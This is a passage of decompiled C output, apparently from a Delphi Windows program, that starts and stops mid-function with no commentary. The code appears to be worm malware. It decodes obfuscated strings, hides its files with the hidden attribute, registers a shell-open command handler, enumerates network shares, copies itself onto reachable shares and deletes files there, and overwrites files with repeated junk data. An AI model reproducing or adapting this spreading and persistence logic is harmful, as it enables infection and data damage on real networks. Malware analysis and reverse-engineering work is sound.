              System::__linkproc__ LStrCat3(&v18, v28, v26);
              (*(void (**)(void))(**(_DWORD **)a3 + 52))();
            }
          }
        }
      }
    }
    while ( !Sysutils::FindNext((int)v25) );
  }
  sub_4072B8((int)v25);
  v14 = v17;
  __writefsdword(0, v16[0]);
  v17 = (LStr *)&loc_417BD2;
  System::__linkproc__ LStrArrayClr(v14, 7);
  System::__linkproc__ FinalizeRecord((int)v25, (int)dword_4061D8);
  System::__linkproc__ LStrArrayClr(v15, 2);
}
// 4179F4: variable 'v6' is possibly undefined
// 4179F9: variable 'v8' is possibly undefined
// 417A06: variable 'v7' is possibly undefined
// 417ADE: variable 'v11' is possibly undefined
// 417AF4: variable 'v12' is possibly undefined
// 417BC5: variable 'v15' is possibly undefined
// 4061D8: using guessed type int dword_4061D8[5];
// 417BE4: using guessed type int dword_417BE4[3];
// 417BF0: using guessed type int dword_417BF0[3];
// 417BFC: using guessed type int dword_417BFC[3];
// 417C08: using guessed type int dword_417C08;

//----- (00417C20) --------------------------------------------------------
void __usercall sub_417C20(BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  bool v6; // sf
  bool v7; // of
  int v8; // esi
  int v9; // ebx
  int v10; // esi
  int v11; // et0
  LStr *v12; // ecx
  unsigned int v13[2]; // [esp-Ch] [ebp-18h] BYREF
  LStr *v14; // [esp-4h] [ebp-10h]
  BYTE *v15; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v15 = a1;
  sub_4038D8((int)a1);
  v14 = (LStr *)&savedregs;
  v13[1] = (unsigned int)&loc_417C7C;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v7 = __OFSUB__(a3, a2);
  v6 = a3 - a2 < 0;
  v8 = a3 - a2;
  if ( v6 == v7 )
  {
    v11 = a2;
    v9 = v8 + 1;
    v10 = v11;
    do
    {
      sub_417928(v15, *(char **)(*(_DWORD *)(a4 - 4) + 4 * v10++), (int)&dword_41EF14, 0);
      --v9;
    }
    while ( v9 );
  }
  v12 = v14;
  __writefsdword(0, v13[0]);
  v14 = (LStr *)&loc_417C83;
  System::__linkproc__ LStrClr(v12);
}
// 41EF14: using guessed type int dword_41EF14;

//----- (00417C88) --------------------------------------------------------
void __userpurge sub_417C88(BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5, int a6)
{
  int v7; // eax
  LStr *v8; // ecx
  LStr *v9; // ecx
  char *v10; // [esp-18h] [ebp-130h]
  int v11; // [esp-Ch] [ebp-124h] BYREF
  void *v12; // [esp-8h] [ebp-120h]
  int *v13; // [esp-4h] [ebp-11Ch]
  LStr *v14; // [esp+0h] [ebp-118h]
  BYTE *v15; // [esp+4h] [ebp-114h] BYREF
  BYTE *v16; // [esp+8h] [ebp-110h] BYREF
  char *v17; // [esp+Ch] [ebp-10Ch] BYREF
  unsigned __int8 v18[256]; // [esp+10h] [ebp-108h] BYREF
  int v19; // [esp+110h] [ebp-8h]
  BYTE *v20; // [esp+114h] [ebp-4h]
  int savedregs; // [esp+118h] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v19 = a2;
  v20 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v19);
  v13 = &savedregs;
  v12 = &loc_417D7E;
  v11 = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  (*(void (__stdcall **)(int))(*(_DWORD *)dword_41EF14 + 64))(v11);
  sub_417C20(v20, a3, a5, a6);
  v7 = sub_4177BC(v19, a4);
  sub_40296C(v7, v18);
  sub_4036EC((BYTE **)&dword_41EEF4, v18);
  v11 = 1;
  sub_41620C(v19, &v16);
  v10 = (char *)v16;
  System::__linkproc__ LStrCat3(&v15, (BYTE *)a, "\\FA0");
  sub_415EAC((int)v15, v10, dword_41EEF4, &v17, 1, v11);
  v8 = v14;
  __writefsdword(0, (unsigned int)v12);
  v14 = (LStr *)&loc_417D85;
  System::__linkproc__ LStrArrayClr(v8, 3);
  System::__linkproc__ LStrArrayClr(v9, 2);
}
// 417D78: variable 'v9' is possibly undefined
// 41EF14: using guessed type int dword_41EF14;

//----- (00417D9C) --------------------------------------------------------
void __userpurge sub_417D9C(BYTE *a1@<eax>, BYTE *a2@<edx>, BYTE *a3@<ecx>, int a4, int a5, int a6)
{
  int v6; // eax
  LStr *v7; // ecx
  LStr *v8; // ecx
  char *v9; // [esp-18h] [ebp-13Ch]
  int v10; // [esp-Ch] [ebp-130h] BYREF
  void *v11; // [esp-8h] [ebp-12Ch]
  int *v12; // [esp-4h] [ebp-128h]
  LStr *v13; // [esp+0h] [ebp-124h]
  BYTE *v14; // [esp+8h] [ebp-11Ch] BYREF
  BYTE *v15; // [esp+Ch] [ebp-118h] BYREF
  char *v16; // [esp+10h] [ebp-114h] BYREF
  unsigned __int8 v17[256]; // [esp+14h] [ebp-110h] BYREF
  char *v18; // [esp+114h] [ebp-10h] BYREF
  BYTE *v19; // [esp+118h] [ebp-Ch]
  BYTE *v20; // [esp+11Ch] [ebp-8h]
  BYTE *v21; // [esp+120h] [ebp-4h]
  int savedregs; // [esp+124h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v18 = 0;
  v19 = a3;
  v20 = a2;
  v21 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v20);
  sub_4038D8((int)v19);
  v12 = &savedregs;
  v11 = &loc_417EF5;
  v10 = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10);
  (*(void (__stdcall **)(int))(*(_DWORD *)dword_41EF14 + 64))(v10);
  sub_417C20(v20, a5, a4, a6);
  sub_417C20(v19, a5, a4, a6);
  sub_415FAC((int)"9luv", 0, &v18);
  System::__linkproc__ LStrCat3((BYTE **)&dword_41EEF4, v21, v18);
  (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 100))();
  Sysutils::FileSetAttr(2u, dword_41EEF4);
  v6 = (*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))();
  sub_40296C(v6, v17);
  sub_4036EC((BYTE **)&dword_41EEF4, v17);
  v10 = 1;
  sub_41620C((int)v21, &v15);
  v9 = (char *)v15;
  System::__linkproc__ LStrCat3(&v14, (BYTE *)a, "\\FA0");
  sub_415EAC((int)v14, v9, dword_41EEF4, &v16, 1, v10);
  v7 = v13;
  __writefsdword(0, (unsigned int)v11);
  v13 = (LStr *)&loc_417EFC;
  System::__linkproc__ LStrArrayClr(v7, 3);
  System::__linkproc__ LStrArrayClr(v8, 4);
}
// 417EEF: variable 'v8' is possibly undefined
// 41EF14: using guessed type int dword_41EF14;

//----- (00417F24) --------------------------------------------------------
int *__usercall sub_417F24@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v2; // eax
  int v3; // eax
  char *v4; // ecx
  char *v5; // ecx
  char v6; // zf
  int v7; // ebx
  LStr *v8; // ecx
  BYTE *v10; // [esp-18h] [ebp-84h]
  char *v11; // [esp-10h] [ebp-7Ch]
  char *v12; // [esp-10h] [ebp-7Ch]
  unsigned int v13[2]; // [esp-Ch] [ebp-78h] BYREF
  LStr *v14; // [esp-4h] [ebp-70h]
  BYTE *v15; // [esp+4h] [ebp-68h] BYREF
  BYTE *v16; // [esp+8h] [ebp-64h] BYREF
  BYTE *v17; // [esp+Ch] [ebp-60h] BYREF
  char *v18; // [esp+10h] [ebp-5Ch] BYREF
  char *v19; // [esp+14h] [ebp-58h] BYREF
  char *v20; // [esp+18h] [ebp-54h] BYREF
  BYTE *v21; // [esp+1Ch] [ebp-50h] BYREF
  BYTE *v22; // [esp+20h] [ebp-4Ch] BYREF
  BYTE *v23; // [esp+24h] [ebp-48h] BYREF
  BYTE *v24; // [esp+28h] [ebp-44h] BYREF
  char *v25; // [esp+2Ch] [ebp-40h] BYREF
  char *v26; // [esp+30h] [ebp-3Ch] BYREF
  char *v27; // [esp+34h] [ebp-38h] BYREF
  char *v28; // [esp+38h] [ebp-34h] BYREF
  char *v29; // [esp+3Ch] [ebp-30h] BYREF
  char *v30; // [esp+40h] [ebp-2Ch] BYREF
  char *v31; // [esp+44h] [ebp-28h] BYREF
  char *v32; // [esp+48h] [ebp-24h] BYREF
  char *v33; // [esp+4Ch] [ebp-20h] BYREF
  char *v34; // [esp+50h] [ebp-1Ch] BYREF
  char *v35; // [esp+54h] [ebp-18h] BYREF
  char *v36; // [esp+58h] [ebp-14h] BYREF
  BYTE *v37; // [esp+5Ch] [ebp-10h] BYREF
  BYTE *v38; // [esp+60h] [ebp-Ch] BYREF
  int v39; // [esp+64h] [ebp-8h]
  char **v40; // [esp+68h] [ebp-4h] BYREF
  int savedregs; // [esp+6Ch] [ebp+0h] BYREF

  v39 = a1;
  sub_4038D8(a1);
  v14 = (LStr *)&savedregs;
  v13[1] = (unsigned int)&loc_4182D1;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_415EAC((int)a, (char *)dword_4182F4, (char *)dword_4182E8, &v36, 1, 1);
  TObject_Create(&off_40BBB4);
  dword_41EF14 = v2;
  TObject_Create(&off_40BBB4);
  dword_41EF18 = v3;
  sub_4045A0((int *)&v40, (int)dword_417C10, 1, 10);
  sub_415FAC((int)dword_418300, 0, &v35);
  __linkproc__ LStrAsg(v40 + 1, v35);
  sub_415FAC((int)"sn~5:", 0, &v34);
  __linkproc__ LStrAsg(v40 + 2, v34);
  sub_415FAC((int)"tx~5:", 0, &v33);
  __linkproc__ LStrAsg(v40 + 3, v33);
  sub_415FAC((int)dword_418330, 0, &v32);
  __linkproc__ LStrAsg(v40 + 4, v32);
  sub_415FAC((int)"67nzo", 0, &v31);
  __linkproc__ LStrAsg(v40 + 5, v31);
  sub_415FAC((int)dword_418350, 0, &v30);
  __linkproc__ LStrAsg(v40 + 6, v30);
  sub_415FAC((int)dword_418360, 0, &v29);
  __linkproc__ LStrAsg(v40 + 7, v29);
  sub_415FAC((int)dword_418370, 0, &v28);
  __linkproc__ LStrAsg(v40 + 8, v28);
  sub_415FAC((int)dword_418380, 0, &v27);
  __linkproc__ LStrAsg(v40 + 9, v27);
  sub_415FAC((int)"Ojmsq", 0, &v26);
  sub_415EAC((int)dword_41EEEC, v26, 0, (char **)&v37, 0, 0);
  sub_415FAC((int)dword_4183A0, 0, &v25);
  System::__linkproc__ LStrCat3(&v38, (BYTE *)dword_41EEE8, v25);
  if ( !v39 )
  {
    System::__linkproc__ LStrCat3(&v24, v38, (char *)dword_4183AC);
    sub_417C88(v37, (int)v24, 1, a2, 1, (int)&savedregs);
    System::__linkproc__ LStrCat3(&v23, v38, (char *)dword_4183B8);
    sub_417C88(v37, (int)v23, 2, a2, 3, (int)&savedregs);
    System::__linkproc__ LStrCat3(&v22, v38, (char *)dword_4183C4);
    sub_417C88(v37, (int)v22, 4, a2, 4, (int)&savedregs);
    System::__linkproc__ LStrCat3(&v21, v38, (char *)dword_4183D0);
    sub_417C88((BYTE *)dword_41EEE0, (int)v21, 4, a2, 4, (int)&savedregs);
    v4 = v11;
  }
  if ( !v39 || (System::__linkproc__ LStrCmp(v4, (char *)dword_4183DC), v6) )
  {
    sub_415FAC((int)dword_4183E8, 0, &v18);
    sub_415EAC((int)v18, 0, 0, &v19, 0, 0);
    Sysutils::ExtractFilePath(v19, &v20);
    __linkproc__ LStrAsg(&dword_41EEF4, v20);
    if ( dword_41EEF4 )
    {
      v7 = sub_403724((int)dword_41EEF4);
      UniqueString(&dword_41EEF4)[v7 - 1] = 32;
    }
    else
    {
      __linkproc__ LStrAsg(&dword_41EEF4, dword_41EEE8);
    }
    Sysutils::TrimRight(dword_41EEF4, (char **)&v17);
    v10 = v17;
    System::__linkproc__ LStrCat3(&v16, v38, (char *)dword_41841C);
    sub_417C88(v10, (int)v16, 9, a2, 9, (int)&savedregs);
    v5 = v12;
  }
  if ( !v39 || (System::__linkproc__ LStrCmp(v5, (char *)dword_418428), v6) )
  {
    System::__linkproc__ LStrCat3(&v15, v38, (char *)&dword_418434);
    sub_417D9C(v15, (BYTE *)dword_41EEE0, (BYTE *)dword_41EEE4, 7, 5, (int)&savedregs);
  }
  sub_402BDC((_DWORD *)dword_41EF14);
  sub_402BDC((_DWORD *)dword_41EF18);
  System::__linkproc__ DynArrayClear((int *)&v40, (int)dword_417C10);
  v8 = v14;
  __writefsdword(0, v13[0]);
  v14 = (LStr *)&loc_4182D8;
  System::__linkproc__ LStrArrayClr(v8, 25);
  return System::__linkproc__ DynArrayClear((int *)&v40, (int)dword_417C10);
}
// 417F75: variable 'v2' is possibly undefined
// 417F86: variable 'v3' is possibly undefined
// 418189: variable 'v11' is possibly undefined
// 418198: variable 'v4' is possibly undefined
// 41819D: variable 'v6' is possibly undefined
// 418246: variable 'v12' is possibly undefined
// 418255: variable 'v5' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 417C10: using guessed type int dword_417C10[2];
// 4182E8: using guessed type int dword_4182E8[3];
// 4182F4: using guessed type int dword_4182F4[3];
// 418300: using guessed type int dword_418300[4];
// 418330: using guessed type int dword_418330[4];
// 418350: using guessed type int dword_418350[4];
// 418360: using guessed type int dword_418360[4];
// 418370: using guessed type int dword_418370[4];
// 418380: using guessed type int dword_418380[4];
// 4183A0: using guessed type int dword_4183A0[3];
// 4183AC: using guessed type int dword_4183AC[3];
// 4183B8: using guessed type int dword_4183B8[3];
// 4183C4: using guessed type int dword_4183C4[3];
// 4183D0: using guessed type int dword_4183D0[3];
// 4183DC: using guessed type int dword_4183DC[3];
// 4183E8: using guessed type int dword_4183E8[13];
// 41841C: using guessed type int dword_41841C[3];
// 418428: using guessed type int dword_418428[3];
// 418434: using guessed type int dword_418434;
// 41EF14: using guessed type int dword_41EF14;
// 41EF18: using guessed type int dword_41EF18;

//----- (00418438) --------------------------------------------------------
void __usercall sub_418438(char *a1@<eax>, char *a2@<edx>)
{
  _DWORD *v2; // eax
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-1E0h] BYREF
  LStr *v5; // [esp-4h] [ebp-1D8h]
  _DWORD v6[115]; // [esp+0h] [ebp-1D4h] BYREF
  char *v7; // [esp+1CCh] [ebp-8h]
  char *v8; // [esp+1D0h] [ebp-4h]
  int savedregs; // [esp+1D4h] [ebp+0h] BYREF

  v7 = a2;
  v8 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v7);
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_4184B7;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  System::__linkproc__ Assign(v6, v8);
  sub_405005((int)v6);
  v2 = sub_403A60(v6, v7);
  sub_40520F(v2);
  CLOSE((int)v6);
  v3 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_4184BE;
  System::__linkproc__ LStrArrayClr(v3, 2);
}

//----- (004184C4) --------------------------------------------------------
void __usercall sub_4184C4(struct _NETRESOURCEA *a1@<eax>, int a2)
{
  DWORD v2; // esi
  char *v3; // ebx
  char *v4; // eax
  LStr *v5; // ecx
  LStr *v6; // ecx
  LStr *v7; // ecx
  char *v8; // [esp-10h] [ebp-CE8h]
  char *v9; // [esp-10h] [ebp-CE8h]
  char *v10[2]; // [esp-Ch] [ebp-CE4h] BYREF
  LStr *v11; // [esp-4h] [ebp-CDCh]
  char *v12; // [esp+8h] [ebp-CD0h] BYREF
  BYTE *v13; // [esp+Ch] [ebp-CCCh] BYREF
  char *v14; // [esp+10h] [ebp-CC8h] BYREF
  char *v15; // [esp+14h] [ebp-CC4h] BYREF
  char *v16; // [esp+18h] [ebp-CC0h] BYREF
  char *v17; // [esp+1Ch] [ebp-CBCh] BYREF
  char *v18; // [esp+20h] [ebp-CB8h] BYREF
  char *v19; // [esp+24h] [ebp-CB4h] BYREF
  BYTE *v20; // [esp+28h] [ebp-CB0h] BYREF
  char *v21; // [esp+2Ch] [ebp-CACh] BYREF
  BYTE *v22; // [esp+30h] [ebp-CA8h] BYREF
  BYTE *v23; // [esp+34h] [ebp-CA4h] BYREF
  char v24[4]; // [esp+38h] [ebp-CA0h] BYREF
  char v25[4]; // [esp+3Ch] [ebp-C9Ch] BYREF
  BYTE *v26; // [esp+40h] [ebp-C98h] BYREF
  char *v27; // [esp+44h] [ebp-C94h] BYREF
  char Buffer[12]; // [esp+48h] [ebp-C90h] BYREF
  char v29; // [esp+54h] [ebp-C84h] BYREF
  BYTE *v30; // [esp+CC8h] [ebp-10h] BYREF
  DWORD BufferSize; // [esp+CCCh] [ebp-Ch] BYREF
  DWORD cCount; // [esp+CD0h] [ebp-8h] BYREF
  HANDLE hEnum; // [esp+CD4h] [ebp-4h] BYREF
  int savedregs; // [esp+CD8h] [ebp+0h] BYREF

  v11 = (LStr *)&savedregs;
  v10[1] = (char *)&loc_4187C9;
  v10[0] = (char *)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  BufferSize = 3200;
  if ( !WNetOpenEnumA(2u, 0, 0, a1, &hEnum) )
  {
    cCount = 100;
    WNetEnumResourceA(hEnum, &cCount, Buffer, &BufferSize);
    v2 = cCount;
    if ( (int)cCount > 0 )
    {
      v3 = &v29;
      do
      {
        if ( (*(_DWORD *)v3 & 2) == 2 )
        {
          sub_4184C4(a2);
        }
        else if ( (*((_DWORD *)v3 - 2) & 1) == 1 )
        {
          __linkproc__ LStrFromPChar_0(&v30, *((BYTE **)v3 + 2));
          sub_415FAC((int)dword_4187E0, 0, &v27);
          __linkproc__ LStrAsg(&dword_41EEF4, v27);
          v25[1] = *dword_41EEE8;
          v25[0] = 1;
          sub_402848(v24, v25);
          __linkproc__ PStrNCat((unsigned __int8 *)v24, (unsigned __int8 *)dword_4187F8, 2u);
          sub_4036EC(&v26, (unsigned __int8 *)v24);
          System::__linkproc__ LStrCat(&v26, dword_41EEF4);
          v8 = (char *)v26;
          System::__linkproc__ LStrCat3(&v23, v30, dword_41EEF4);
          if ( (unsigned __int8)sub_416178(v8, (char *)v23, 1) )
          {
            sub_415FAC((int)dword_418804, 0, &v21);
            System::__linkproc__ LStrCat3(&v22, v30, v21);
            v9 = (char *)v22;
            System::__linkproc__ LStrCat3(&v20, (BYTE *)"@win ", dword_41EEF4);
            sub_418438(v9, (char *)v20);
            sub_415FAC((int)dword_41882C, 0, &v19);
            __linkproc__ LStrAsg(&dword_41EEF4, v19);
            sub_415FAC((int)dword_418844, 0, &v17);
            System::__linkproc__ LStrCatN(&v18, 3);
            sub_415FAC((int)dword_418854, 0, &v15);
            System::__linkproc__ LStrCatN(&v16, 3);
            sub_416178(v16, v10[0], 1);
            v10[0] = (char *)v30;
            sub_415FAC((int)dword_418854, 0, &v14);
            System::__linkproc__ LStrCatN(&dword_41EEF4, 3);
            v4 = sub_4038E8(dword_41EEF4);
            DeleteFileA(v4);
            sub_403670(&v13);
            sub_415FAC((int)dword_418868, 0, &v12);
            System::__linkproc__ LStrCat(&v13, v12);
            sub_416178((char *)v13, dword_41EEF4, 0);
          }
        }
        v3 += 32;
        --v2;
      }
      while ( v2 );
    }
  }
  v5 = v11;
  __writefsdword(0, (unsigned int)v10[0]);
  v11 = (LStr *)&loc_4187D0;
  System::__linkproc__ LStrArrayClr(v5, 12);
  System::__linkproc__ LStrArrayClr(v6, 2);
  System::__linkproc__ LStrClr(v7);
}
// 4187BB: variable 'v6' is possibly undefined
// 4187C3: variable 'v7' is possibly undefined
// 4187E0: using guessed type int dword_4187E0[6];
// 4187F8: using guessed type int dword_4187F8[3];
// 418804: using guessed type int dword_418804[6];
// 41882C: using guessed type int dword_41882C[4];
// 418844: using guessed type int dword_418844[4];
// 418854: using guessed type int dword_418854[5];
// 418868: using guessed type int dword_418868[6];

//----- (00418880) --------------------------------------------------------
void __usercall sub_418880(char *a1@<eax>)
{
  char *v1; // ecx
  char v2; // zf
  LStr *v3; // ecx
  char *v4; // [esp-1Ch] [ebp-7Ch]
  char *v5; // [esp-1Ch] [ebp-7Ch]
  int v6; // [esp-Ch] [ebp-6Ch] BYREF
  void *v7; // [esp-8h] [ebp-68h]
  int *v8; // [esp-4h] [ebp-64h]
  LStr *v9; // [esp+0h] [ebp-60h]
  char *v10; // [esp+4h] [ebp-5Ch] BYREF
  BYTE *v11; // [esp+8h] [ebp-58h] BYREF
  char *v12; // [esp+Ch] [ebp-54h] BYREF
  char *v13; // [esp+10h] [ebp-50h] BYREF
  BYTE *v14; // [esp+14h] [ebp-4Ch] BYREF
  char *v15; // [esp+18h] [ebp-48h] BYREF
  char *v16; // [esp+1Ch] [ebp-44h] BYREF
  char *v17; // [esp+20h] [ebp-40h] BYREF
  char *v18; // [esp+24h] [ebp-3Ch] BYREF
  BYTE *v19; // [esp+2Ch] [ebp-34h] BYREF
  char *v20; // [esp+30h] [ebp-30h] BYREF
  BYTE *v21; // [esp+34h] [ebp-2Ch] BYREF
  char *v22; // [esp+38h] [ebp-28h] BYREF
  char *v23; // [esp+3Ch] [ebp-24h] BYREF
  BYTE *v24; // [esp+40h] [ebp-20h] BYREF
  char *v25; // [esp+44h] [ebp-1Ch] BYREF
  char *v26; // [esp+48h] [ebp-18h] BYREF
  BYTE *v27; // [esp+4Ch] [ebp-14h] BYREF
  char *v28; // [esp+50h] [ebp-10h] BYREF
  char *v29; // [esp+54h] [ebp-Ch] BYREF
  char *v30; // [esp+58h] [ebp-8h] BYREF
  char *v31; // [esp+5Ch] [ebp-4h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v31 = a1;
  sub_4038D8((int)a1);
  v8 = &savedregs;
  v7 = &loc_418B06;
  v6 = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  sub_415EAC((int)a, (char *)dword_418B28, (char *)dword_418B1C, &v29, 1, 1);
  sub_415FAC((int)dword_418B34, 0, &v28);
  __linkproc__ LStrAsg(&dword_41EEF4, v28);
  System::__linkproc__ LStrCat3(&v27, (BYTE *)dword_41EEE8, dword_41EEF4);
  sub_416178(v31, (char *)v27, 1);
  sub_415FAC((int)dword_418B48, 0, &v30);
  sub_415FAC((int)dword_418B88, 0, &v25);
  v4 = v25;
  System::__linkproc__ LStrCat3(&v24, (BYTE *)dword_41EEE8, dword_41EEF4);
  sub_415EAC((int)v30, v4, (char *)v24, &v26, 1, 0);
  if ( !v26 )
  {
    sub_415FAC((int)dword_418B88, 0, &v22);
    v5 = v22;
    System::__linkproc__ LStrCat3(&v21, (BYTE *)dword_41EEE8, dword_41EEF4);
    sub_415EAC((int)v30, v5, (char *)v21, &v23, 1, 1);
  }
  sub_415FAC((int)dword_418B9C, 0, &v20);
  __linkproc__ LStrAsg(&dword_41EEF4, v20);
  System::__linkproc__ LStrCat3(&v19, (BYTE *)dword_41EEF0, dword_41EEF4);
  sub_416178(v31, (char *)v19, 1);
  sub_415FAC((int)dword_418BB0, 0, &v30);
  System::__linkproc__ LStrCatN(&v18, 4);
  sub_415EAC((int)v30, 0, v18, (char **)2, 0, v6);
  System::__linkproc__ LStrCmp(v1, "\"%1\" %*");
  if ( v2 )
  {
    v6 = 1;
    System::__linkproc__ LStrCatN(&v16, 4);
    sub_415EAC((int)v30, 0, v16, &v17, 2, v6);
  }
  sub_4184C4(0, (int)&savedregs);
  if ( sub_4028F4(0x21u) == 8 )
  {
    sub_415FAC((int)dword_418C04, 0, &v15);
    __linkproc__ LStrAsg(&dword_41EEF4, v15);
    System::__linkproc__ LStrCat3(&v14, (BYTE *)dword_41EEF8, dword_41EEF4);
    sub_416178(v31, (char *)v14, 1);
    v6 = 0;
    sub_415FAC((int)dword_418C18, 0, &v12);
    sub_415EAC((int)dword_41EEEC, v12, 0, &v13, 0, v6);
    __linkproc__ LStrAsg(&dword_41EEF4, v13);
    sub_415FAC((int)dword_418C28, 0, &v10);
    System::__linkproc__ LStrCat3(&v11, (BYTE *)dword_41EEF4, v10);
    sub_416178(v31, (char *)v11, 0);
  }
  v3 = v9;
  __writefsdword(0, (unsigned int)v7);
  v9 = (LStr *)&loc_418B0D;
  System::__linkproc__ LStrArrayClr(v3, 23);
}
// 418A05: variable 'v1' is possibly undefined
// 418A0A: variable 'v2' is possibly undefined
// 418B1C: using guessed type int dword_418B1C[3];
// 418B28: using guessed type int dword_418B28[3];
// 418B34: using guessed type int dword_418B34[5];
// 418B48: using guessed type int dword_418B48[16];
// 418B88: using guessed type int dword_418B88[3];
// 418B9C: using guessed type int dword_418B9C[5];
// 418BB0: using guessed type int dword_418BB0[9];
// 418C04: using guessed type int dword_418C04[5];
// 418C18: using guessed type int dword_418C18[4];
// 418C28: using guessed type int dword_418C28[8];
// 41EEF0: using guessed type int dword_41EEF0;

//----- (00418C48) --------------------------------------------------------
void __userpurge sub_418C48(char *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<esi>, __int64 a5)
{
  int v5; // esi
  char *v6; // ecx
  LStr *v7; // ecx
  unsigned int v8[2]; // [esp-14h] [ebp-2978h] BYREF
  LStr *v9; // [esp-Ch] [ebp-2970h]
  int v10; // [esp-8h] [ebp-296Ch]
  int v11; // [esp-4h] [ebp-2968h]
  char v12[10240]; // [esp+0h] [ebp-2964h] BYREF
  _DWORD v13[83]; // [esp+2800h] [ebp-164h] BYREF
  __int64 v14; // [esp+294Ch] [ebp-18h]
  int v15; // [esp+2958h] [ebp-Ch] BYREF
  int v16; // [esp+295Ch] [ebp-8h]
  char *v17; // [esp+2960h] [ebp-4h]
  int savedregs; // [esp+2964h] [ebp+0h] BYREF
  __int64 v19; // [esp+296Ch] [ebp+8h]

  v11 = a3;
  v10 = a4;
  v16 = a2;
  v17 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v16);
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_418DB9;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v14 = 1i64;
  v5 = sub_403724(v16);
  v15 = 1;
  v6 = v12;
  do
  {
    if ( v5 < v14 )
      v14 = 1i64;
    *v6 = *(_BYTE *)(v16 + v14++ - 1);
    ++v15;
    ++v6;
  }
  while ( v15 != 10241 );
  v14 = 0i64;
  v19 = (a5 - 640) / 10240;
  v15 = 10240;
  System::__linkproc__ Assign(v13, v17);
  *off_41DC30 = 0;
  sub_405124((int)v13, 1);
  sub_40265C();
  while ( v19 > v14 )
  {
    sub_404F1C((int)v13, v12, v15, (DWORD *)&v15);
    sub_40265C();
    ++v14;
  }
  CLOSE((int)v13);
  sub_40265C();
  Sysutils::FileSetAttr(2u, v17);
  v7 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_418DC0;
  System::__linkproc__ LStrArrayClr(v7, 2);
}
// 418C48: could not find valid save-restore pair for ebx
// 418C48: could not find valid save-restore pair for esi
// 41DC30: using guessed type char *off_41DC30;

//----- (00418DC8) --------------------------------------------------------
void __usercall sub_418DC8(char *a1@<eax>)
{
  char *v1; // eax
  ATOM v2; // bx
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  LStr *v5; // [esp-4h] [ebp-Ch]
  char *v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = a1;
  sub_4038D8((int)a1);
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_418E17;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  do
  {
    v1 = sub_4038E8(v6);
    v2 = GlobalFindAtomA(v1);
    GlobalDeleteAtom(v2);
  }
  while ( v2 );
  v3 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_418E1E;
  System::__linkproc__ LStrClr(v3);
}

//----- (00418E24) --------------------------------------------------------
char __usercall sub_418E24@<al>(char *a1@<eax>, char *a2@<edx>, FARPROC *a3@<ecx>)
{
  char *v4; // ebx
  HMODULE v5; // ebx
  char *v6; // eax
  LStr *v7; // ecx
  unsigned int v9[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v10; // [esp-4h] [ebp-18h]
  char v11; // [esp+Bh] [ebp-9h]
  char *v12; // [esp+Ch] [ebp-8h]
  char *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = a2;
  v13 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v12);
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_418EAB;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v11 = 0;
  v4 = sub_4038E8(v13);
  if ( LoadLibraryA(v4) )
  {
    v5 = GetModuleHandleA_1(v4);
    if ( v5 )
    {
      v6 = sub_4038E8(v12);
      *a3 = GetProcAddress_0(v5, v6);
      if ( *a3 )
        v11 = 1;
    }
  }
  v7 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_418EB2;
  System::__linkproc__ LStrArrayClr(v7, 2);
  return v11;
}

//----- (00418EBC) --------------------------------------------------------
int __usercall sub_418EBC@<eax>(char a1@<al>, int a2@<ebx>)
{
  char *v2; // ecx
  char v3; // zf
  int v4; // eax
  bool v5; // bl
  int v6; // eax
  int v7; // ebx
  LStr *v8; // ecx
  unsigned int v10[2]; // [esp-10h] [ebp-24h] BYREF
  LStr *v11; // [esp-8h] [ebp-1Ch]
  int v12; // [esp-4h] [ebp-18h]
  char *v13; // [esp+0h] [ebp-14h] BYREF
  char *v14; // [esp+4h] [ebp-10h] BYREF
